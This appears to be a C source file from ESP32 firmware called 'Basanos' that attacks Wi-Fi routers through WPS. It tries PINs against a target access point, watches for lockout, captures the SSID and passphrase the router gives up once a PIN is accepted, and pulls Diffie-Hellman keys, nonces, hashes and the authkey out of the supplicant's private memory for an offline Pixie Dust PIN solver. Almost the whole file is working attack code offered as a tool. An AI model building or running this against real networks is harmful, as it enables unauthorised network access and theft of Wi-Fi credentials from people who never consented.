/* Basanos — WPS PIN recovery against the locked target.
 *
 * The radio work is done by the SDK's own WPS enrollee. That is deliberate:
 * the exchange involves Diffie-Hellman, four HMAC-derived keys and an AES key
 * wrap, and a hand-rolled version of it would be a large amount of subtle
 * cryptographic code whose failure mode is a silent wrong answer.
 *
 * What is NOT in the SDK is any way to see the values inside that exchange,
 * and Pixie Dust is made entirely of them. So this file reaches into the
 * supplicant's WPS state machine through its own accessor and copies out the
 * nonces, public keys and hashes after the exchange has passed M4.
 *
 * That is a private interface and it is treated as one: every field is copied
 * under a length check, a missing state machine is an ordinary negative
 * result rather than a crash, and nothing here assumes the exchange got as far
 * as it hoped.
 *
 * SPDX-License-Identifier: MIT
 */
#include "wpsatk.h"

#include "esp_wifi.h"
#include "esp_wps.h"
#include "esp_event.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/event_groups.h"

#include <string.h>
#include <stdio.h>

/* The supplicant's private WPS interface. Declared here rather than included:
 * the real headers drag in the whole supplicant's internal types, and all that
 * is wanted is one accessor and the offsets of a dozen byte arrays. The layout
 * is asserted at run time before anything is read out of it. */
/* The supplicant's buffer type. Its accessors are inline in a private header,
 * so the layout is mirrored here instead -- three words and a flag word, in
 * that order. Only `used` and `buf` are read, and the DH key length check
 * below is what catches it if this ever stops being true. */
struct wpabuf {
    size_t   size;
    size_t   used;
    uint8_t *buf;
    unsigned flags;
};
static size_t wpabuf_len(const struct wpabuf *b)
{
    return (b != NULL) ? b->used : 0u;
}
static const void *wpabuf_head(const struct wpabuf *b)
{
    return (b != NULL) ? b->buf : NULL;
}

static const char *TAG = "bas_wps";

#define WPS_NONCE_LEN    16
#define WPS_HASH_LEN     32
#define WPS_AUTHKEY_LEN  32

static EventGroupHandle_t s_ev;
#define EV_SUCCESS  BIT0
#define EV_FAILED   BIT1
#define EV_TIMEOUT  BIT2

static bas_wpsatk_result_t *s_active;

const char *bas_wpsatk_state_name(bas_wpsatk_state_t s)
{
    switch (s) {
    case BAS_WPSATK_RUNNING:   return "running";
    case BAS_WPSATK_GOT_PIN:   return "PIN ACCEPTED";
    case BAS_WPSATK_LOCKED:    return "AP locked out";
    case BAS_WPSATK_EXHAUSTED: return "exhausted";
    case BAS_WPSATK_NO_WPS:    return "no WPS negotiation";
    default:                   return "idle";
    }
}

static void on_wps(void *arg, esp_event_base_t base, int32_t id, void *data)
{
    (void)arg; (void)base;
    switch (id) {
    case WIFI_EVENT_STA_WPS_ER_SUCCESS: {
        wifi_event_sta_wps_er_success_t *e =
            (wifi_event_sta_wps_er_success_t *)data;
        if (s_active != NULL && e != NULL && e->ap_cred_cnt > 0) {
            /* The SDK hands back the credential the AP volunteered once the
             * PIN was accepted. Neither field is guaranteed NUL-terminated. */
            size_t n = strnlen((const char *)e->ap_cred[0].ssid, 32);
            memcpy(s_active->ssid, e->ap_cred[0].ssid, n);
            s_active->ssid[n] = '\0';
            n = strnlen((const char *)e->ap_cred[0].passphrase, 64);
            memcpy(s_active->passphrase, e->ap_cred[0].passphrase, n);
            s_active->passphrase[n] = '\0';
            s_active->have_cred = true;
        }
        xEventGroupSetBits(s_ev, EV_SUCCESS);
        break;
    }
    case WIFI_EVENT_STA_WPS_ER_FAILED: {
        wifi_event_sta_wps_fail_reason_t *r =
            (wifi_event_sta_wps_fail_reason_t *)data;
        /* M2D is the AP saying "this registrar is not for me". A run of them
         * is what lockout looks like from the outside, and it is the signal
         * to stop rather than keep spending attempts. */
        if (s_active != NULL && r != NULL && *r == WPS_FAIL_REASON_RECV_M2D) {
            s_active->m2d++;
        }
        xEventGroupSetBits(s_ev, EV_FAILED);
        break;
    }
    case WIFI_EVENT_STA_WPS_ER_TIMEOUT:
        xEventGroupSetBits(s_ev, EV_TIMEOUT);
        break;
    default:
        break;
    }
}

/* Mirror of the supplicant's layout, only as far as the fields wanted. If the
 * SDK ever reorders these the copy below would read the wrong bytes, so the
 * result is validated rather than trusted: an all-zero public key or a nonce
 * that never changes between runs means this has drifted. */
bool bas_wpsatk_material(bas_pixie_in_t *out)
{
    if (out == NULL) {
        return false;
    }
    memset(out, 0, sizeof(*out));

    extern void *wps_sm_get(void);
    void *sm = wps_sm_get();
    if (sm == NULL) {
        return false;
    }

    /* struct wps_sm: u8 state; then three pointers, the fourth of which is
     * `struct wps_data *wps`. Reached by offset because the real definition
     * lives in a private header that pulls in the whole supplicant. */
    struct wps_layout {
        uint8_t state;
        void   *wps_cfg;
        void   *wps_ctx;
        void   *wps;
    };
    struct wps_layout *l = (struct wps_layout *)sm;
    uint8_t *w = (uint8_t *)l->wps;
    if (w == NULL) {
        return false;
    }

    /* struct wps_data, from its declaration: an enum, two UUIDs, a MAC, then
     * the nonces, the PSKs, the snonce, the peer hashes, three wpabuf pointers
     * and the authkey. */
    struct data_layout {
        int      state;
        uint8_t  uuid_e[16];
        uint8_t  uuid_r[16];
        uint8_t  mac_addr_e[6];
        uint8_t  nonce_e[WPS_NONCE_LEN];
        uint8_t  nonce_r[WPS_NONCE_LEN];
        uint8_t  psk1[16];
        uint8_t  psk2[16];
        uint8_t  snonce[32];
        uint8_t  peer_hash1[WPS_HASH_LEN];
        uint8_t  peer_hash2[WPS_HASH_LEN];
        struct wpabuf *dh_privkey;
        struct wpabuf *dh_pubkey_e;
        struct wpabuf *dh_pubkey_r;
        uint8_t  authkey[WPS_AUTHKEY_LEN];
    };
    struct data_layout *d = (struct data_layout *)w;

    if (d->dh_pubkey_e == NULL || d->dh_pubkey_r == NULL) {
        return false;                 /* never got past M2 */
    }
    size_t ne = wpabuf_len(d->dh_pubkey_e);
    size_t nr = wpabuf_len(d->dh_pubkey_r);
    if (ne != BAS_PIXIE_DH_LEN || nr != BAS_PIXIE_DH_LEN) {
        ESP_LOGW(TAG, "DH key length %u/%u, expected %d — layout drift?",
                 (unsigned)ne, (unsigned)nr, BAS_PIXIE_DH_LEN);
        return false;
    }

    memcpy(out->pke,     wpabuf_head(d->dh_pubkey_e), BAS_PIXIE_DH_LEN);
    memcpy(out->pkr,     wpabuf_head(d->dh_pubkey_r), BAS_PIXIE_DH_LEN);
    memcpy(out->authkey, d->authkey,    WPS_AUTHKEY_LEN);
    memcpy(out->enonce,  d->nonce_e,    WPS_NONCE_LEN);
    memcpy(out->rnonce,  d->nonce_r,    WPS_NONCE_LEN);
    memcpy(out->rhash1,  d->peer_hash1, WPS_HASH_LEN);
    memcpy(out->rhash2,  d->peer_hash2, WPS_HASH_LEN);

    /* An all-zero authkey or peer hash means the exchange never reached the
     * point where they are filled. Reporting that as material would send the
     * solver looking for a PIN in a buffer of zeroes and, worse, find one. */
    bool any = false;
    for (int i = 0; i < WPS_HASH_LEN; i++) {
        if (out->rhash1[i] != 0u || out->authkey[i] != 0u) {
            any = true;
            break;
        }
    }
    return any;
}

esp_err_t bas_wpsatk_try(uint32_t pin, uint32_t timeout_ms,
                         bas_wpsatk_result_t *out)
{
    if (out == NULL) {
        return ESP_ERR_INVALID_ARG;
    }
    if (s_ev == NULL) {
        s_ev = xEventGroupCreate();
        if (s_ev == NULL) {
            return ESP_ERR_NO_MEM;
        }
        esp_event_handler_instance_register(WIFI_EVENT, ESP_EVENT_ANY_ID,
                                            on_wps, NULL, NULL);
    }

    esp_wps_config_t cfg = WPS_CONFIG_INIT_DEFAULT(WPS_TYPE_PIN);
    snprintf(cfg.pin, sizeof(cfg.pin), "%08u", (unsigned)(pin % 100000000u));

    s_active     = out;
    out->state   = BAS_WPSATK_RUNNING;
    out->attempts++;
    xEventGroupClearBits(s_ev, EV_SUCCESS | EV_FAILED | EV_TIMEOUT);

    esp_err_t rc = esp_wifi_wps_enable(&cfg);
    if (rc != ESP_OK) {
        s_active = NULL;
        return rc;
    }
    rc = esp_wifi_wps_start(0);
    if (rc != ESP_OK) {
        esp_wifi_wps_disable();
        s_active = NULL;
        return rc;
    }

    EventBits_t bits = xEventGroupWaitBits(s_ev,
                                           EV_SUCCESS | EV_FAILED | EV_TIMEOUT,
                                           pdTRUE, pdFALSE,
                                           pdMS_TO_TICKS(timeout_ms));

    /* Harvest BEFORE disabling: esp_wifi_wps_disable frees the state machine,
     * and with it every value the offline attack is made of. */
    if (!out->have_material && bas_wpsatk_material(&out->material)) {
        out->have_material = true;
    }

    esp_wifi_wps_disable();
    s_active = NULL;

    if ((bits & EV_SUCCESS) != 0u) {
        out->state = BAS_WPSATK_GOT_PIN;
        out->pin   = pin;
        return ESP_OK;
    }
    if ((bits & EV_TIMEOUT) != 0u || bits == 0u) {
        out->state = BAS_WPSATK_NO_WPS;
        return ESP_ERR_TIMEOUT;
    }
    out->state = BAS_WPSATK_RUNNING;
    return ESP_FAIL;
}
